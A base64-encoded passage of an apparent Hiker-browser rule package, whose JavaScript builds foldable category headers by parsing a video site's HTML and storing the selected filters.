CAgY2FzZSBcXFwicGFyc2VEb21Gb3JIdG1sXFxcIjpcXG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFxcXCJwZGZoXFxcIjpcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2UgPSBwYXJzZURvbUZvckh0bWw7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlID0gcGFyc2VEb207XFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgdXJsID0gcGFyc2Uoc3JjLCBtVXJsUnVsZSk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGlmICh1cmxSdWxlLmRlYWxVcmwpIHtcXG4gICAgICAgICAgICAgICAgdXJsID0gdXJsUnVsZS5kZWFsVXJsKHVybClcXG4gICAgICAgICAgICB9IGVsc2UgaWYgKHVybFJ1bGVbJ+S6jOasoeWkhOeQhiddKSB7XFxuICAgICAgICAgICAgICAgIHVybCA9IHVybFJ1bGVbJ+S6jOasoeWkhOeQhiddKHVybClcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIGlmICh1cmxSdWxlLnN0YXJ0c1dpdGgoXFxcIkBqczpcXFwiKSkge1xcbiAgICAgICAgICAgICAgICB1cmwgPSB0aGlzLmV2YWxKU1J1bGUoc3JjLCB1cmxSdWxlKTtcXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICB1cmwgPSBwYXJzZURvbShzcmMsIHVybFJ1bGUpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiB1cmwgfHwgXFxcIlxcXCI7XFxuICAgIH0sXFxuICAgIGJ1aWxkKCkge1xcbiAgICAgICAgLy8g5qOA5rWL5piv5ZCm5Lyg5YWl6ZyA6KaB55qE5Y+C5pWwXFxuICAgICAgICB0aGlzLmNoZWNrUGFyYW1zKClcXG4gICAgICAgIC8vIOavj+S4gOS4quWIhuexu+eahOWUr+S4gOagh+ivhlxcbiAgICAgICAgbGV0IG1UYWcgPSB0aGlzW3N5bWJvbE1hcC5tVGFnXSB8fCBcXFwiXFxcIlxcbiAgICAgICAgLy/nv7vpobUg6ZyA6KaB5qC55o2u5a6e6ZmF5pu/5o2iXFxuICAgICAgICBjb25zdCBodG1sID0gdGhpc1tzeW1ib2xNYXAuc3JjXSB8fCByZXF1ZXN0KHRoaXNbc3ltYm9sTWFwLnRydWVfdXJsXSlcXG4gICAgICAgIGNvbnN0IGVtcHR5ID0gXFxcImhpa2VyOi8vZW1wdHlcXFwiXFxuICAgICAgICAvL+iOt+WPluWIl+ihqFxcbiAgICAgICAgY29uc3QgY2F0ZWdvcmllcyA9IFtdXFxuICAgICAgICB0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF0ubWFwKHJ1bGVPYmogPT4ge1xcbiAgICAgICAgICAgIGxldCBsaXN0ID0gW11cXG4gICAgICAgICAgICBsZXQgbGlzdFJ1bGUgPSBydWxlT2JqLmxpc3RSdWxlIHx8IHJ1bGVPYmpbXFxcIuS4gOe6p+WIhuexu1xcXCJdXFxuICAgICAgICAgICAgaWYgKGxpc3RSdWxlLnN0YXJ0c1dpdGgoXFxcIkBqczpcXFwiKSkge1xcbiAgICAgICAgICAgICAgICAvLyBsb2coJC5zdHJpbmdpZnkobGlzdFJ1bGUpKVxcbiAgICAgICAgICAgICAgICBsaXN0ID0gdGhpcy5ldmFsSlNSdWxlKGh0bWwsIGxpc3RSdWxlKVxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgIGxpc3QgPSBwYXJzZURvbUZvckFycmF5KGh0bWwsIGxpc3RSdWxlKVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAvLyBsb2cobGlzdClcXG4gICAgICAgICAgICBsaXN0Lm1hcChjYXRlZ29yeSA9PiB7XFxuICAgICAgICAgICAgICAgIGNhdGVnb3JpZXMucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICBsaXN0OiBjYXRlZ29yeSxcXG4gICAgICAgICAgICAgICAgICAgIHN1Ykxpc3RSdWxlOiBydWxlT2JqLnN1Ykxpc3RSdWxlIHx8IHJ1bGVPYmpbXFxcIuWtkOWIhuexu1xcXCJdLFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGVSdWxlOiBydWxlT2JqLnRpdGxlUnVsZSB8fCBydWxlT2JqW1xcXCLliIbnsbvmoIfpophcXFwiXSxcXG4gICAgICAgICAgICAgICAgICAgIHVybFJ1bGU6IHJ1bGVPYmoudXJsUnVsZSB8fCBydWxlT2JqW1xcXCLliIbnsbvpk77mjqVcXFwiXSxcXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgfSlcXG4gICAgICAgIH0pXFxuXFxuICAgICAgICAvLyBsb2coJC5zdHJpbmdpZnkoY2F0ZWdvcmllcykpXFxuXFxuICAgICAgICBsZXQgaW5pdF9jYXRlID0gW11cXG4gICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgMjA7IGkrKykge1xcbiAgICAgICAgICAgIGluaXRfY2F0ZS5wdXNoKFxcXCIwXFxcIilcXG4gICAgICAgIH1cXG5cXG4gICAgICAgIGNvbnN0IGNhdGVfdGVtcF9qc29uID0gZ2V0TXlWYXIobVRhZyArIHRoaXMuVkFSTUFQLkNBVEVHT1JZLCBKU09OLnN0cmluZ2lmeShpbml0X2NhdGUpKVxcbiAgICAgICAgY29uc3QgY2F0ZV90ZW1wID0gSlNPTi5wYXJzZShjYXRlX3RlbXBfanNvbilcXG5cXG4gICAgICAgIGlmICh0aGlzW3N5bWJvbE1hcC5tUGFnZV0gPT09IDEpIHtcXG5cXG4gICAgICAgICAgICBjYXRlZ29yaWVzLmZvckVhY2goKGNhdGVnb3J5LCBpbmRleCkgPT4ge1xcblxcbiAgICAgICAgICAgICAgICAvLyDmipjlj6AgVUlcXG4gICAgICAgICAgICAgICAgaWYgKHRoaXNbc3ltYm9sTWFwLm1Gb2xkSW5uZXJFbmFibGVdICYmIHRoaXNbc3ltYm9sTWFwLm1Gb2xkTGF5b3V0XS5pbmplY3RJbmRleCA9PT0gKGluZGV4KzEpKSB7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgZm9sZExheW91dCA9IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogdGhpc1tzeW1ib2xNYXAubUZvbGRMYXlvdXRdLnRpdGxlIHx8ICh0aGlzW3N5bWJvbE1hcC5tRm9sZF0gPT09ICcxJyA/ICfigJzigJzigJ3igJ08Yj48c3BhbiBzdHlsZT1cXFwiY29sb3I6ICNGRjAwMDBcXFwiPuKIqDwvc3Bhbj48L2I+JyA6ICfigJzigJzigJ3igJ08Yj48c3BhbiBzdHlsZT1cXFwiY29sb3I6ICMxYWFkMTlcXFwiPuKIpzwvc3Bhbj48L2I+JyksXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiB0aGlzW3N5bWJvbE1hcC5tRm9sZExheW91dF0udXJsIHx8ICQoXFxcImhpa2VyOi8vZW1wdHkjbm9IaXN0b3J5I1xcXCIpLmxhenlSdWxlKChwYXJhbXMpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIocGFyYW1zLm1UYWcgKyBwYXJhbXMuVkFSTUFQLkZPTEQsIGdldE15VmFyKHBhcmFtcy5tVGFnICsgcGFyYW1zLlZBUk1BUC5GT0xELCBwYXJhbXMuaXNGb2xkKSA9PT0gJzEnID8gJzAnIDogJzEnKVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCJcXG4gICAgICAgICAgICAgICAgICAgICAgICB9LCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1UYWc6IG1UYWcsXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzRm9sZDogdGhpc1tzeW1ib2xNYXAubUZvbGRdLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBWQVJNQVA6IHRoaXMuVkFSTUFQXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSksXFxuICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IHRoaXNbc3ltYm9sTWFwLm1Gb2xkTGF5b3V0XS5jb2xfdHlwZSB8fCBcXFwic2Nyb2xsX2J1dHRvblxcXCIsXFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICB0aGlzW3N5bWJvbE1hcC5tTGF5b3V0XS5wdXNoKGZvbGRMYXlvdXQpXFxuICAgICAgICAgICAgICAgIH1cXG5cXG4gICAgICAgICAgICAgICAgLy/lhbfkvZPliJfooajkuIvnmoTliIbnsbtcXG4gICAgICAgICAgICAgICAgbGV0IHN1Yl9jYXRlZ29yaWVzID0gW107XFxuICAgICAgICAgICAgICAgIGlmIChjYXRlZ29yeS5zdWJMaXN0UnVsZS5zdGFydHNXaXRoKFxcXCJAanM6XFxcIikpIHtcXG4gICAgICAgICAgICAgICAgICAgIHN1Yl9jYXRlZ29yaWVzID0gdGhpcy5ldmFsSlNSdWxlKGNhdGVnb3J5Lmxpc3QsIGNhdGVnb3J5LnN1Ykxpc3RSdWxlKVxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICAgICAgc3ViX2NhdGVnb3JpZXMgPSBwYXJzZURvbUZvckFycmF5KGNhdGVnb3J5Lmxpc3QsIGNhdGVnb3J5LnN1Ykxpc3RSdWxlKTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBpZiAoaW5kZXggPCAodGhpc1tzeW1ib2xNYXAubUZvbGRJbmRleF0gfHwgMSkpIHtcXG4gICAgICAgICAgICAgICAgICAgIHN1Yl9jYXRlZ29yaWVzLmZvckVhY2goKGl0ZW0sIGtleSkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCB0aXRsZSA9IHRoaXMuZ2V0VGl0bGUoaXRlbSwgY2F0ZWdvcnkpXFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHVybCA9IHRoaXMuZ2V0VXJsKGl0ZW0sIGNhdGVnb3J5KVxcblxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXNbc3ltYm9sTWFwLm1MYXlvdXRdLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXRsZToga2V5LnRvU3RyaW5nKCkgPT09IGNhdGVfdGVtcFtpbmRleF0gPyAn4oCc4oCc4oCd4oCdPGI+PGZvbnQgY29sb3I9JyArIHRoaXNbc3ltYm9sTWFwLm1Db2xvcl0gKyAnPicgKyB0aXRsZSArICcgPC9mb250PjwvYj4nIDogdGl0bGUsXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybDogJCh1cmwpLmxhenlSdWxlKChwYXJhbXMpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBuZXdfY2F0ZSA9IFtdXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAocGFyYW1zLmluZGV4ID09PSAwKSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1zLmNhdGVfdGVtcC5mb3JFYWNoKChjYXRlLCBpbmRleCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuZXdfY2F0ZS5wdXNoKGluZGV4ID09PSAwID8gcGFyYW1zLmtleS50b1N0cmluZygpIDogXFxcIjBcXFwiKVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJhbXMuY2F0ZV90ZW1wW3BhcmFtcy5pbmRleF0gPSBwYXJhbXMua2V5LnRvU3RyaW5nKClcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKHBhcmFtcy50YWcgKyBwYXJhbXMuVkFSTUFQLkNBVEVHT1JZLCBKU09OLnN0cmluZ2lmeShwYXJhbXMuaW5kZXggPT09IDAgPyBuZXdfY2F0ZSA6IHBhcmFtcy5jYXRlX3RlbXApKVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIocGFyYW1zLnRhZyArIHBhcmFtcy5WQVJNQVAuVVJMLCBpbnB1dClcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKHRydWUpXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGVfdGVtcDogY2F0ZV90ZW1wLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5kZXg6IGluZGV4LFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVkFSTUFQOiB0aGlzLlZBUk1BUCxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhZzogbVRhZyxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGtleToga2V5LFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFnZTogdGhpc1tzeW1ib2xNYXAubVBhZ2VdLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KSxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICAgICAgICAgIHRoaXNbc3ltYm9sTWFwLm1MYXlvdXRdLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwiYmxhbmtfYmxvY2tcXFwiXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgfSBlbHNlIGlmICh0aGlzW3N5bWJvbE1hcC5tRm9sZF0gPT09ICcwJykge1xcbiAgICAgICAgICAgICAgICAgICAgc3ViX2NhdGVnb3JpZXMuZm9yRWFjaCgoaXRlbSwga2V5KSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHRpdGxlID0gdGhpcy5nZXRUaXRsZShpdGVtLCBjYXRlZ29yeSlcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgdXJsID0gdGhpcy5nZXRVcmwoaXRlbSwgY2F0ZWdvcnkpXFxuXFxuICAgICAgICAgICAgICAgICAgICAgICAgdGhpc1tzeW1ib2xNYXAubUxheW91dF0ucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBrZXkudG9TdHJpbmcoKSA9PT0gY2F0ZV90ZW1wW2luZGV4XSA/ICfigJzigJzigJ3igJ08Yj48Zm9udCBjb2xvcj0nICsgdGhpc1tzeW1ib2xNYXAubUNvbG9yXSArICc+JyArIHRpdGxlICsgJyA8L2ZvbnQ+PC9iPicgOiB0aXRsZSxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiAkKHVybCkubGF6eVJ1bGUoKHBhcmFtcykgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1zLmNhdGVfdGVtcFtwYXJhbXMuaW5kZXhdID0gcGFyYW1zLmtleS50b1N0cmluZygpXFxuXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihwYXJhbXMudGFnICsgcGFyYW1zLlZBUk1BUC5DQVRFR09SWSwgSlNPTi5zdHJpbmdpZnkocGFyYW1zLmNhdGVfdGVtcCkpXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihwYXJhbXMudGFnICsgcGFyYW1zLlZBUk1BUC5VUkwsIGlucHV0KVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UodHJ1ZSlcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCJcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0ZV90ZW1wOiBjYXRlX3RlbXAsXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmRleDogaW5kZXgsXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBWQVJNQVA6IHRoaXMuVkFSTUFQLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFnOiBtVGFnLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAga2V5OiBrZXksXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYWdlOiB0aGlzW3N5bWJvbE1hcC5tUGFnZV0sXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICAgICAgICAgdGhpc1tzeW1ib2xNYXAubUxheW91dF0ucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJibGFua19ibG9ja1xcXCJcXG4gICAgICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9XFxuICAgIH0sXFxuXFxuICAgIOeVjOmdoihsYXlvdXQpIHtcXG4gICAgICAgIHJldHVybiB0aGlzLmxheW91dChsYXlvdXQpXFxuICAgIH0sXFxuICAgIOWIhuexu+mTvuaOpSh0cnVlVXJsKSB7XFxuICAgICAgICByZXR1cm4gdGhpcy50cnVlVXJsKHRydWVVcmwpO1xcbiAgICB9LFxcbiAgICDpobXnoIEocGFnZSkge1xcbiAgICAgICAgcmV0dXJuIHRoaXMucGFnZShwYWdlKTtcXG4gICAgfSxcXG4gICAg5rqQ56CBKGh0bWwpIHtcXG4gICAgICAgIHJldHVybiB0aGlzLmh0bWwoaHRtbCk7XFxuICAgIH0sXFxuICAgIOWumuS9jeS4gOe6p+WIhuexuyhsaXN0KSB7XFxuICAgICAgICByZXR1cm4gdGhpcy5saXN0KGxpc3QpO1xcbiAgICB9LFxcbiAgICDlrprkvY3lrZDliIbnsbsoc3ViTGlzdCkge1xcbiAgICAgICAgcmV0dXJuIHRoaXMuc3ViTGlzdChzdWJMaXN0KTtcXG4gICAgfSxcXG4gICAg5a6a5L2N5YiG57G75qCH6aKYKHRpdGxlKSB7XFxuICAgICAgICByZXR1cm4gdGhpcy50aXRsZSh0aXRsZSk7XFxuICAgIH0sXFxuICAgIOWumuS9jeWIhuexu+mTvuaOpSh1cmwpIHtcXG4gICAgICAgIHJldHVybiB0aGlzLnVybCh1cmwpO1xcbiAgICB9LFxcbiAgICDlvIDlkK/lhoXnva7mipjlj6Dlip/og70oKSB7XFxuICAgICAgICByZXR1cm4gdGhpcy5mb2xkSW5uZXIodHJ1ZSk7XFxuICAgIH0sXFxuICAgIOWFs+mXreWGhee9ruaKmOWPoOWKn+iDvSgpIHtcXG4gICAgICAgIHJldHVybiB0aGlzLmZvbGRJbm5lcihmYWxzZSk7XFxuICAgIH0sXFxuICAgIOesrOWHoOihjOW8gOWni+aKmOWPoChpbmRleCkge1xcbiAgICAgICAgcmV0dXJuIHRoaXMuZm9sZEluZGV4KGluZGV4KTtcXG4gICAgfSxcXG4gICAg5oqY5Y+g5oyJ6ZKu5qC35byPKGxheW91dCkge1xcbiAgICAgICAgcmV0dXJuIHRoaXMuZm9sZExheW91dChsYXlvdXQpXFxuICAgIH0sXFxuICAgIOaKmOWPoChmb2xkKSB7XFxuICAgICAgICByZXR1cm4gdGhpcy5mb2xkKGZvbGQpO1xcbiAgICB9LFxcbiAgICDpgInkuK3nmoTliIbnsbvpopzoibIoY29sb3IpIHtcXG4gICAgICAgIHJldHVybiB0aGlzLmNvbG9yKGNvbG9yKTtcXG4gICAgfSxcXG4gICAg5ZSv5LiA5qCH6K+GKG1UYWcpIHtcXG4gICAgICAgIHJldHVybiB0aGlzLnRhZyhtVGFnKVxcbiAgICB9LFxcbiAgICDmt7vliqDliIbnsbvlrprkvY0ocnVsZU9iaikge1xcbiAgICAgICAgcmV0dXJuIHRoaXMuYWRkKHJ1bGVPYmopO1xcbiAgICB9LFxcbiAgICDlvIDlp4vmiZPpgKDliIbnsbsoKSB7XFxuICAgICAgICByZXR1cm4gdGhpcy5idWlsZCgpO1xcbiAgICB9LFxcblxcbn0pXFxuJC5leHBvcnRzID0gbmV3IENhdGVnb3JpZXNIZWFkZXIoKTtcXG4kLmV4cG9ydHNcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuWKqOaAgVvkuoxdKlwiLFwicGF0aFwiOlwiZHRmbFwiLFwicnVsZVwiOlwiY29uc3QgZW1wdHkgPSBcXFwiaGlrZXI6Ly9lbXB0eVxcXCJcXG5cXG5pZiAodHlwZW9mKOaLvOaOpeWIhuexuykgIT0gJ3VuZGVmaW5lZCcgJiYg5ou85o6l5YiG57G7ICE9ICcnKSB7XFxuICAgIHZhciBjYXRlZ29yaWVzID0gcGRmYShodG1sLCDlpKfnsbvlrprkvY0pLmNvbmNhdChwZGZhKGh0bWwsIOaLvOaOpeWIhuexuykpXFxufSBlbHNlIHtcXG4gICAgdmFyIGNhdGVnb3JpZXMgPSBwZGZhKGh0bWwsIOWkp+exu+WumuS9jSlcXG59XFxuXFxubGV0IGluaXRfY2F0ZSA9IFtdXFxuXFxuZm9yIChsZXQgaSA9IDA7IGkgPCAyMDsgaSsrKSB7XFxuICAgIGluaXRfY2F0ZS5wdXNoKFxcXCIwXFxcIilcXG59XFxuXFxuY29uc3QgZm9sZCA9IGdldE15VmFyKE1ZX1JVTEUuZ3JvdXAsIFxcXCIwXFxcIilcXG5jb25zdCBjYXRlX3RlbXBfanNvbiA9IGdldE15VmFyKE1ZX1JVTEUudGl0bGUsIEpTT04uc3RyaW5naWZ5KGluaXRfY2F0ZSkpXFxuY29uc3QgY2F0ZV90ZW1wID0gSlNPTi5wYXJzZShjYXRlX3RlbXBfanNvbilcXG5cXG5pZiAocGFyc2VJbnQocGFnZSkgPT09IDEpIHtcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBmb2xkID09PSAnMScgPyAn4oCc4oCc4oCd4oCdPGI+JyArICfiiKgnLmZvbnRjb2xvcihcXFwiI0ZGMDAwMFxcXCIpICsgJzwvYj4nIDogJ+KAnOKAnOKAneKAnTxiPicgKyAn4oinJy5mb250Y29sb3IoXFxcIiMxYWFkMTlcXFwiKSArICc8L2I+JyxcXG4gICAgICAgIHVybDogJCgpLmxhenlSdWxlKChmb2xkKSA9PiB7XFxuICAgICAgICAgICAgcHV0TXlWYXIoTVlfUlVMRS5ncm91cCwgZm9sZCA9PT0gJzEnID8gJzAnIDogJzEnKTtcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIlxcbiAgICAgICAgfSwgZm9sZCksXFxuICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcbiAgICB9KVxcbiAgICBjYXRlZ29yaWVzLmZvckVhY2goKGNhdGVnb3J5LCBpbmRleCkgPT4ge1xcbiAgICAgICAgbGV0IHN1Yl9jYXRlZ29yaWVzID0gcGRmYShjYXRlZ29yeSwg5bCP57G75a6a5L2NKTtcXG4gICAgICAgIGlmIChpbmRleCA9PT0gMCkge1xcbiAgICAgICAgICAgIHN1Yl9jYXRlZ29yaWVzLmZvckVhY2goKGl0ZW0sIGtleSkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgdGl0bGUgPSBwZGZoKGl0ZW0sIOWIhuexu+agh+mimClcXG4gICAgICAgICAgICAgICAgaWYgKHR5cGVvZijmjpLpmaQpICE9ICd1bmRlZmluZWQnICYmIOaOkumZpCAhPSAnJykge1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGUgPSB0aXRsZS5yZXBsYWNlKG5ldyBSZWdFeHAo5o6S6ZmkLCBcXFwiZ1xcXCIpLCBcXFwiXFxcIilcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGtleS50b1N0cmluZygpID09PSBjYXRlX3RlbXBbaW5kZXhdID8gXFxcIuKAnOKAnOKAneKAnVxcXCIgKyB0aXRsZS5mb250Y29sb3Io5YiG57G76aKc6ImyKSA6IHRpdGxlLFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiAkKHBkKGl0ZW0sIOWIhuexu+mTvuaOpSkgKyAnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgocGFyYW1zKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IG5ld19jYXRlID0gW11cXG4gICAgICAgICAgICAgICAgICAgICAgICBwYXJhbXMuY2F0ZV90ZW1wLmZvckVhY2goKGNhdGUsIGluZGV4KSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5ld19jYXRlLnB1c2goaW5kZXggPT09IDAgPyBwYXJhbXMua2V5LnRvU3RyaW5nKCkgOiBcXFwiMFxcXCIpXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihNWV9SVUxFLnRpdGxlLCBKU09OLnN0cmluZ2lmeShuZXdfY2F0ZSkpXFxuICAgICAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoTVlfUlVMRS51cmwsIGlucHV0KVxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKHRydWUpXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIlxcbiAgICAgICAgICAgICAgICAgICAgfSwge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhdGVfdGVtcDogY2F0ZV90ZW1wLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGtleToga2V5LFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHBhZ2U6IHBhZ2UsXFxuICAgICAgICAgICAgICAgICAgICB9KSxcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxuICAgICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcImJsYW5rX2Jsb2NrXFxcIlxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfSBlbHNlIGlmIChmb2xkID09PSAnMScpIHtcXG4gICAgICAgICAgICBzdWJfY2F0ZWdvcmllcy5mb3JFYWNoKChpdGVtLCBrZXkpID0+IHtcXG4gICAgICAgICAgICAgICAgbGV0IHRpdGxlID0gcGRmaChpdGVtLCDliIbnsbvmoIfpopgpXFxuICAgICAgICAgICAgICAgIGlmICh0eXBlb2Yo5o6S6ZmkKSAhPSAndW5kZWZpbmVkJyAmJiDmjpLpmaQgIT0gJycpIHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlID0gdGl0bGUucmVwbGFjZShuZXcgUmVnRXhwKOaOkumZpCwgXFxcImdcXFwiKSwgXFxcIlxcXCIpXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBrZXkudG9TdHJpbmcoKSA9PT0gY2F0ZV90ZW1wW2luZGV4XSA/IFxcXCLigJzigJzigJ3igJ1cXFwiICsgdGl0bGUuZm9udGNvbG9yKOWIhuexu+minOiJsikgOiB0aXRsZSxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogJChwZChpdGVtLCDliIbnsbvpk77mjqUpICsgJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKHBhcmFtcykgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHBhcmFtcy5jYXRlX3RlbXBbcGFyYW1zLmluZGV4XSA9IHBhcmFtcy5rZXkudG9TdHJpbmcoKVxcblxcbiAgICAgICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKE1ZX1JVTEUudGl0bGUsIEpTT04uc3RyaW5naWZ5KHBhcmFtcy5jYXRlX3RlbXApKVxcbiAgICAgICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKE1ZX1JVTEUudXJsLCBpbnB1dClcXG4gICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoU